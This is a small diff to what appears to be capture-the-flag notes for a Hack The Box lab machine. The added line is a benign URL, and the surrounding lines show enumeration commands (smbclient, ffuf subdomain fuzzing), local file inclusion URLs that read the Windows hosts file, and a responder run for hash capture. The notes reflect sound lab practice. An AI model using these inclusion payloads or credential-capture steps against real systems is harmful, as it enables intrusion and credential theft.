@@ -154,6 +154,7 @@ http://10.10.11.187/webalizer
 smbclient -L \\\\10.10.11.187\\
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -fs 7069 -fw 22
 http://school.flight.htb/
+http://school.flight.htb/index.php?view=home.html
 http://school.flight.htb/index.php?view=C:\Windows\System32\drivers\etc\hosts
 http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts
 responder -I tun0 -v
